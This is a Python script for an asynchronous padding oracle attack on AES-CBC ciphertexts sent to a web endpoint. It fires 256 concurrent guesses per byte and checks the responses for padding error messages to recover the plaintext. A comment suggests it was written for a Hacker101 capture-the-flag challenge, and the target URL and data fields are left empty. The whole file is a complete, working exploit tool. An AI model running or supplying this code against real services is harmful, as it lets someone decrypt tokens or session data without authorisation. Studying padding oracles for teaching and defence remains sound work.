import base64
import asyncio
import aiohttp


base_url = ""
data = ""
block_size = 16  # AES block size is fixed to 16 bytes. Other CBC algorithms will differ. h101 was so kind to tell us they were using AES <3

# Global set to store unique responses
unique_responses = set()

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

async def test_guess(session, previous_block, current_block, byte_index, padding_value, intermediate_state, base_url, guess):
    modified_block = bytearray(previous_block)

    for i in range(1, padding_value + 1):
        modified_block[-i] = xor_bytes(bytes([modified_block[-i]]), bytes([intermediate_state[-i] ^ padding_value]))[0]

    modified_block[byte_index] ^= guess
    modified_data = base64.urlsafe_b64encode(modified_block + current_block).decode('utf-8')
    modified_data = modified_data.replace('=', '~').replace('/', '!').replace('+', '-')

    attempt = 1

    while attempt <= 5:
        try:
            url = f"{base_url}{modified_data}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                response_text = await response.text()
                response_text_lower = response_text.lower()

                # Add the response text to the global set
                if response_text not in unique_responses:
                    unique_responses.add(response_text)
                    print(f"New response: {response_text}")

                # Refined error checks
                if response.status == 200 and all(
                    err not in response_text_lower for err in [
                        "padding", 
                        "no json object could be decoded", 
                        "incorrect padding", 
                        "extra data", 
                        "input strings must be a multiple of 16 in length", 
                        "paddingexception"
                    ]
                ):
                    intermediate_state[byte_index] = guess ^ padding_value
                    print(f"Successful guess: {guess} for byte {byte_index}")
                    return guess, True
                else:
                    print(f"Failed guess: {guess} for byte {byte_index} with response: {response_text_lower}")
        except asyncio.TimeoutError:
            print(f"Timeout occurred on attempt {attempt}, retrying...")
            await asyncio.sleep(attempt ** 2)  # Exponential backoff
        except aiohttp.ClientError as e:
            print(f"Client error occurred: {e}")
        except Exception as e:
            print(f"Error occurred: {e}")
        
        attempt += 1

    return guess, False

async def decrypt_block(session, previous_block, current_block, block_size, base_url):
    intermediate_state = bytearray(block_size)
    decrypted_block = bytearray(block_size)

    for byte_index in reversed(range(block_size)):
        padding_value = block_size - byte_index

        success_index = None
        tasks = [asyncio.create_task(test_guess(session, previous_block, current_block, byte_index, padding_value, intermediate_state, base_url, guess)) for guess in range(256)]
        
        for task in asyncio.as_completed(tasks):
            guess, result = await task
            if result:
                success_index = guess
                # Cancel all other pending tasks
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break

        if success_index is not None:
            print(f"Success found at guess {success_index} for byte {byte_index}")
            intermediate_state[byte_index] = success_index ^ padding_value
            decrypted_block[byte_index] = previous_block[byte_index] ^ intermediate_state[byte_index]
        else:
            print(f"No success found for byte {byte_index}")

    print(f"Decrypted block: {decrypted_block}")
    return decrypted_block

async def decrypt_data(encrypted_data, block_size, base_url):
    iv = encrypted_data[:block_size]
    blocks = [encrypted_data[i:i+block_size] for i in range(block_size, len(encrypted_data), block_size)]
    decrypted_message = bytearray()
    previous_block = iv

    async with aiohttp.ClientSession() as session:
        for block in blocks:
            print(f"Decrypting block: {blocks.index(block)}")
            decrypted_block = await decrypt_block(session, previous_block, block, block_size, base_url)
            decrypted_message.extend(decrypted_block)
            previous_block = block

            remaining_blocks = len(blocks) - blocks.index(block) - 1
            print(f"Remaining blocks: {remaining_blocks}")

    return decrypted_message

adjusted_data = data.replace('~', '=').replace('!', '/').replace('-', '+')
binary_data = base64.urlsafe_b64decode(adjusted_data)

decrypted_message = asyncio.run(decrypt_data(binary_data, block_size, base_url))
print(decrypted_message)
print(f"Decrypted message: {decrypted_message.decode(errors='ignore')}")

# Print all unique responses
print("Unique responses captured:")
for response in unique_responses:
    print(response)